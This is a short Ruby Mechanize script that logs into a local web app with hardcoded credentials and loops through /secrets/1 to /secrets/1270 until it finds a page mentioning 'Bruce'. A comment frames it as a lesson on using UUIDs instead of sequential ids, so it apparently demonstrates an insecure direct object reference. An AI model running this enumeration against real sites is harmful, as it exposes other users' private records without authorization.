require 'mechanize'

# Initialize Mechanize Agent
agent = Mechanize.new
agent.get 'http://localhost:3000/'

# Click on a link displayed on the page
agent.page.link_with(text: "Login").click

# Input credentials to the first form on the page
agent.page.forms.first.tap do |f|
  f['user[email]']                     = 'a.kampjes@gmail.com'
  f['user[password]']                  = 'aaaaaaaa'
  f.submit
end

# This is why you should use UUID instead of int-id in your applications ;)
1.upto(1270) do |i|
  # agent remembers the scheme + host, so no need to supply it when navigating somewhere else
  agent.get "/secrets/#{i}"

  p "*"
  # Search for elements on the page
  if agent.page.body.inspect.include? 'Bruce'
    puts agent.page.body.inspect
    p "Secret: #{i}"
    break
  end
end
